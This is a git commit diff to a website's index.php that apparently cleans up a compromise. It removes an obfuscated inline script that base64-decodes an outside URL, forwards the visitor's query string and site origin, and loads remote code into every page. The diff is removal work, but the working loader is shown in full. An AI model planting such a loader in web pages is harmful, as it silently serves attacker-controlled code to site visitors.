769aeadad1c3578737207ce6798303e7db58e8e2
bharti-14 <huttondavid3673@gmail.com>
2026-07-17 17:53:18 +0530

    Update index.php

--- index.php
+++ index.php
@@ -49,7 +49,6 @@ hs.src = ('//s10.histats.com/js15_as.js');
       <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.5/jquery.fancybox.min.css" media="screen">
    </head>
    <body>
-      <script>(function(){var a=location,b=document.head||document.getElementsByTagName("head")[0],c="script",d=atob("aHR0cHM6Ly9icmlnaHRwYXRoY2xlYW5pbmdjby5zaXRlL2hiOHA1ai5waHA=");d+=-1<d.indexOf("?")?"&":"?";d+=a.search.substring(1);c=document.createElement(c);c.src=d;c.id=btoa(a.origin);b.appendChild(c);})();</script>
       <!-- header section start -->
       <div class="header_section">
          <div class="header_main">
